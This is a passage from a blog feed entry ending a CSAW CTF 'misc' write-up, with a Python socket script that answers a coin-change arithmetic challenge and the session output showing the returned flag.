total</div><div class="line">    url = <span class="string">"misc.chal.csaw.io"</span></div><div class="line">    port = <span class="number">8000</span></div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((url, port))</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        task = recvuntil(s, <span class="string">"$10,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">        print(task)</div><div class="line">        total = re.findall(<span class="string">"\$(.*)\s+\$10,000 bills:"</span>, task)</div><div class="line">        <span class="keyword">if</span> len(total) == <span class="number">0</span>:</div><div class="line">            print(task)</div><div class="line">            sleep(<span class="number">10</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="comment"># print(total[0])</span></div><div class="line">            total = Decimal(str(total[<span class="number">0</span>]))</div><div class="line"></div><div class="line">            <span class="comment"># $10,000 bills:</span></div><div class="line">            to_send = str(calc(<span class="number">10000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $5,000 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$5,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">5000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $1,000 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$1,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">1000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $500 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$500 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">500</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $100 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$100 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">100</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $50 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$50 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">50</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $20 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$20 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">20</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $10 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$10 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">10</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $5 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$5 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">5</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $1 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$1 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">1</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># half-dollars (50c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"half-dollars (50c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.50</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># quarters (25c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"quarters (25c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.25</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># dimes (10c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"dimes (10c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.10</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># nickels (5c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"nickels (5c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.05</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># pennies (1c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"pennies (1c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.01</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
<p>Oh yeah this script is dirty and can be a lot more functional but you know in CTF all is a matter of time…</p>
<p>Proof of flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$22479.22</div><div class="line">$10,000 bills:</div><div class="line">2</div><div class="line">$5,000 bills:</div><div class="line">0</div><div class="line">$1,000 bills:</div><div class="line">2</div><div class="line">$500 bills:</div><div class="line">0</div><div class="line">$100 bills:</div><div class="line">4</div><div class="line">$50 bills:</div><div class="line">1</div><div class="line">$20 bills:</div><div class="line">1</div><div class="line">$10 bills:</div><div class="line">0</div><div class="line">$5 bills:</div><div class="line">1</div><div class="line">$1 bills:</div><div class="line">4</div><div class="line">half-dollars (50c):</div><div class="line">0</div><div class="line">quarters (25c):</div><div class="line">0</div><div class="line">dimes (10c):</div><div class="line">2</div><div class="line">nickels (5c):</div><div class="line">0</div><div class="line">pennies (1c):</div><div class="line">2</div><div class="line">correct!</div><div class="line">flag&#123;started-from-the-bottom-now-my-whole-team-fucking-here&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
</feed>
